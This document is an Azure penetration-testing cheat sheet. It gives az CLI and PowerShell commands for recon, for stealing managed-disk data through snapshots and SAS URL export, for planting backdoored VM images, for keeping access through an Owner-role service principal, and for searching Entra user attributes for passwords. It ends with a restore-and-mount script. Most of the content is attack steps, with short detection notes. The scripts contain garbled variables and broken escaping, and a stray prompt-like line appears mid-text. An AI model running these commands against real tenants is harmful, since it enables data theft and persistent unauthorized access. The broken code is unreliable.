...
- **Azure Managed Disks** are block storage volumes used with Azure Virtual Machines.
- Disks can be attached/detached like hard drives.
- Disks can be backed up as **Snapshots** or converted into **Images**.
- A malicious actor with the proper IAM permissions can exfiltrate data from these snapshots by creating a new disk and attaching it to a controlled VM.

## Reconnaissance

- List All Managed Disks: `az disk list -o table`
- Check if a Disk is Encrypted: `az disk show --name \<disk_name\> --resource-group \<rg\> --query 'encryption'`
- List All Snapshots: `az snapshot list -o table`
- Check if a Snapshot is Encrypted: `az snapshot show --name \<snapshot_name\> --resource-group \<rg\> --query 'encryption'`

## Exploitation & Data Exfiltration 💥

**Pre-requisites**:

Role with permission to read disks and snapshots (Microsoft.Compute/disks/\*, Microsoft.Compute/snapshots/\*).- Permissions to create and attach disks to VMs.

### Exploitation Workflow

1. Create a Snapshot from a Target Disk

    `az snapshot create --resource-group <target_rg> --source <target_disk_id> --name <new_snapshot_name>`

2. Create a New Disk from the Snapshot

    `az disk create --resource-group <attacker_rg> --name <new_disk_name> --source <snapshot_id> --location <region>`

    >⚠️ Must be in the **same region** as the target VM to attach!

3. Attach the New Disk to an Attacker-Controlled VM

    `az vm disk attach --resource-group <rg> --vm-name <vm_name> --name <new_disk_name>`

4. Mount the Disk Inside the VM (Linux Example)
...
- **Read but no login access:** If you can't access the original VM but can create snapshots, you can still steal data by attaching snapshots to another VM.
- **Lateral movement:** Enumerate and attach disks from other resource groups if cross-RG privileges are present.
- **Bypass:** Use snapshot+image to create a new VM (if allowed) to maintain persistence.

## Persistence Tactic

- Create a **new image** from a snapshot with your own backdoor or beacon.

    `az image create --resource-group <rg> --name <malicious_image_name> --source <snapshot_id>`

- Deploy future VMs from this backdoored image.

## Export Disk Through SAS URL

Export Azure Managed Disk via SAS URL (Forensic Imaging / Data Exfiltration)

**Scenario**
If the attacker has **Contributor** or **Disk-level RBAC** on an Azure VM or its disk, they can export the OS or data disk using a **Shared Access Signature (SAS)** URL. This enables downloading the full VHD file for offline analysis or lateral movement.

### Generate SAS URL for a Managed Disk
...
✅ **Result**: A time-limited URL (with .vhd extension) which can be used to download the disk.

### Detection & Prevention ⚠️

- Log and alert on: `Microsoft.Compute/disks/beginGetAccess/action`
- Prevent with:
  - Role-based access control (deny `Microsoft.Compute/disks/\*` to untrusted users)
  - Azure Policy to restrict disk export
  - Defender for Cloud alerts on disk operations

## Azure Disk Export via SAS URL

**How attackers might exploit misconfigured SAS URLs and how to identify and secure such vectors?**

**Overview:**
In Azure, exporting a managed disk via a **Shared Access Signature (SAS) URL** is a legitimate operation used for migration or backup. However, when misconfigured, this feature becomes a serious security risk, allowing attackers to **exfiltrate entire virtual disk contents** without authentication.

### Vulnerable Pattern (Non-compliant Code)
...
In a pentest, discovery of such a URL (via logs, storage account enumeration, or leaked config) could allow **download of entire VM disks**, potentially exposing credentials, SSH keys, or cached tokens.
...
- Publicly exposed or leaked SAS URLs (e.g., in GitHub, logs, or config files)
...
This PowerShell script can be used to **enumerate and test for exposed Azure Storage SAS URLs** related to disk exports in a target subscription. This can be used during an Azure penetration test to detect misconfigured or publicly accessible disk blobs.

**🔍 PowerShell: Scan for Exposed SAS URLs in Azure Storage (Disk Export Focus)**
...
Get-AzSqlServerActiveDirectoryAdministrator -ServerName \<SERVER_NAME\> -ResourceGroupName \<RG_NAME\>

## Runbook Discovery (Automation Accounts) ⚙️

- List Automation Accounts: `Get-AzAutomationAccount`
- List Runbooks in a specific Automation Account: `Get-AzAutomationRunbook -AutomationAccountName <account_name> -ResourceGroupName <rg_name>`
- Export Runbook for offline analysis: `Export-AzAutomationRunbook -AutomationAccountName <account_name> -ResourceGroupName <rg_name> -Name <runbook_name> -OutputFolder "C:\Temp"`

## Virtual Machines 🖥️

- List all Virtual Machines: `Get-AzVM`
- Get OS details for a specific VM: `\$vm = Get-AzVM -Name "VM-Name" -ResourceGroupName "RG-Name" $vm.OSProfile`
- Execute commands on a VM (PowerShell script execution): `Invoke-AzVMRunCommand -ResourceGroupName "RG-Name" -VMName "VM-Name" -CommandId 'RunPowerShellScript' -ScriptPath './script.ps1'`

⚠️ Requires sufficient privileges (e.g., Contributor or higher). Use this to run enumeration or establish persistence.

## Networking 🌐

- List Virtual Networks (VNets): `Get-AzVirtualNetwork`
- List Public IP Addresses: `Get-AzPublicIpAddress`
- Get ExpressRoute Circuit Information: `Get-AzExpressRouteCircuit`
- Get Azure VPN Connections: `Get-AzVpnConnection` Useful for mapping out hybrid infrastructure or pivoting opportunities.

## Backdoor: Service Principal Creation (Backdoor 🕳️)

Create a persistent Azure backdoor using a Service Principal with **Owner** or **Company Administrator** role.

- Step 1: Create a new Service Principal: `$spn = New-AzADServicePrincipal -DisplayName "WebService" -Role Owner`
...
- Step 4: Log in using the SPN
  ...
  `\$cred = Get-Credential` Use AppID as username
  `\$UnsecureSecret` as password

    `Connect-AzAccount -Credential \$cred -Tenant "\<Tenant-ID\>" -ServicePrincipal`

🎯 **Persistence tip**: This SPN remains active unless explicitly removed—use it for re-entry.

List down the privilege escalation tactics or detection evasion tips for this section?

## Microsoft Entra - MSOnline PowerShell Module

The **MSOnline** module is especially useful for targeting **Azure AD** in legacy environments or where **MFA bypass** may be possible.

### Setup & Authentication 🛠️

Import the MSOnline module: `Import-Module MSOnline`

Standard login: `Connect-MsolService`
...
> Note 🛑: This method may work when MFA is misconfigured or conditional access is overly permissive.

### Account & Directory Recon 🧾

Tenant & Company Info: `Get-MsolCompanyInformation`

List All Users 👤: `Get-MsolUser -All`

List All Groups 👥: `Get-MsolGroup -All`
...
Useful for spotting exposed metadata like phone numbers, job roles, departments, or credential hints.

  `Get-MsolUser -All \| Format-List`

## Service Principals (Applications / Backdoors) 🎭

List all Azure AD Service Principals: `Get-MsolServicePrincipal`

These represent applications that can be abused for persistence, automation, or privilege escalation.

### Search Microsoft Entra for Leaked Credentials

Scan all user object properties for strings containing "password":

\$users = Get-MsolUser -All
foreach (\$user in \$users) {
\$props = \$user \| Get-Member -MemberType Properties \| Select-Object -ExpandProperty Name
...
**Goal:** Identify accidental password exposure in attributes like Notes, CustomAttributes, or legacy fields.

## Authentication via Az CLI

`az login`

📌 Use this to authenticate interactively or via a stolen refresh token/service principal.

## Azure Pentest CLI Cheat sheet (Az CLI + Tools)

### Authentication

  Interactive login (opens browser): `az login`

  Non-MFA environments: `az login --username user --password pw`

## Azure – Mount a Restored Managed Disk (Snapshot) to a Linux VM (Forensic/Exfil Use)

During a penetration test, gaining access to Azure-managed disk snapshots can lead to full recovery of VM disk content. If the compromised credentials allow snapshot or disk access, you can restore and mount the disk to a VM you control for offline analysis or lateral movement.

> ⚠️**Note**: *Azure disk snapshots* are full point-in-time copies of managed disks. Restoring a disk requires creating a new managed disk from the snapshot.

### Mount Azure Snapshot to a Linux VM

1. Create a Managed Disk from the Snapshot

    `az disk create --resource-group <rg_name> --name restoredDisk01 --source <snapshot-id-or-name>`

2. Attach Disk to Target VM

    `az vm disk attach --vm-name <vm_name> --resource-group <rg_name> --name restoredDisk01`
...
4. List Disks to Identify New Device
    ...
    You should see a new device (e.g., /dev/sdc, /dev/sdd, or /dev/sdX) that wasn’t there before.
    Check if it’s a valid filesystem or needs formatting

    `sudo file -s /dev/sdc`

    - If output shows a filesystem (like ext4, xfs), it’s ready to mount.
    - If not, avoid formatting during a Pentest unless needed — it may destroy data.
...
### Automated Azure Snapshot Restore & Mount Script (Post exploitation)

Restore and mount a disk from an Azure snapshot onto a Linux VM, for use during a **post-exploitation phase** of an Azure penetration test.

**Prerequisites**

- Azure CLI logged in (az login) or SP creds (az login --service-principal ...)
- Permissions: Microsoft.Compute/disks/write, .../snapshots/read, .../virtualMachines/write

**restore_and_mount.sh**

```
\#!/bin/bash
\# Usage: ./restore_and_mount.sh \<RESOURCE_GROUP\> \<SNAPSHOT_NAME\> \<TARGET_VM\> \<MOUNT_PATH\>
RESOURCE_GROUP=\$1
SNAPSHOT_NAME=\$2
TARGET_VM=\$3
...
az disk create --resource-group "<resource_group>" --name "<disk_name>" --source "<snapshot_name" --query "id"  -o tsv
echo "\[\*\] Attaching disk to VM: \$TARGET_VM..."

az vm disk attach --resource-group "\$RESOURCE_GROUP" \\ --vm-name "\$TARGET_VM" \\ --name "\$DISK_NAME"

echo "\[\*\] Waiting 20s for the disk to initialize..."
sleep 20
echo "\[\*\] SSH into VM to mount disk..."
PUBLIC_IP=\$(az vm show -d -g "\$RESOURCE_GROUP" -n "\$TARGET_VM" --query publicIps -o tsv)
SSH_USER=\$(az vm show -g "\$RESOURCE_GROUP" -n "\$TARGET_VM" --query 'osProfile.linuxConfiguration.adminUsername' -o tsv)
...
lsblk
DEVICE=\\(lsblk -o NAME,MOUNTPOINT \| grep -vE "boot\|/" \| grep -E '^sd\|^xvd' \| awk '{print "/dev/" \\1}' \| tail -n 1)
echo "\[\*\] Found device: \\DEVICE"
echo "\[\*\] Creating mount point: \$MOUNT_PATH"
sudo mkdir -p "\$MOUNT_PATH"
echo "\[\*\] Mounting \\DEVICE to \$MOUNT_PATH"
sudo mount \\DEVICE "\$MOUNT_PATH" \|\| echo "\[!\] Mount failed — maybe no partition table?"
echo "\[\*\] Mounted volume:"
df -h "\$MOUNT_PATH"
ls -lah "\$MOUNT_PATH"
EOF
